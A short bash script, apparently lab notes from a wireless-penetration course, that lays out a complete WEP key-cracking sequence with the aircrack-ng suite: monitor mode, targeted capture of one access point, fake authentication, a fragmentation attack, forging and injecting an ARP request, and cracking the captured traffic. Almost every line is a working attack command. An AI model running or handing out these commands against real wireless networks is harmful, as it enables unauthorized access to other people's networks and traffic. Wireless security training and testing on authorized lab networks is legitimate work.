#!/bin/bash

# Place your card in monitor mode on the channel of the AP and start an Airodump capture
airmon-ng start wlan0 1
airodump-ng -c 1 --bssid 1C:7E:E5:32:C7:DE -w WIFU1 mon0

# Conduct a fake authentication with a reassociation timing of 6000s so it doesn't time out
aireplay-ng -1 6000 -e WIFU -a 1C:7E:E5:32:C7:DE -h 00:c0:ca:72:90:55 mon0

# Running the Fragmentation Attack
aireplay-ng -5 -b 1C:7E:E5:32:C7:DE -h 00:c0:ca:72:90:55 mon0

# Generating an ARP Request Packet
# packetforge-ng -0 -a <AP MAC> -h <Your MAC> -k <Dest IP> -l <Source IP> -y <xor file> -w <output file>
packetforge-ng -0 -a 1C:7E:E5:32:C7:DE -h 00:c0:ca:72:90:55 -k 192.168.0.1 -l 192.168.0.255 -y fragment-0330-222552.xor -w arp-request

# Inject the packet to the network
aireplay-ng -2 -r arp-request mon0

# Crack the password
aircrack-ng WIFU1-01.cap
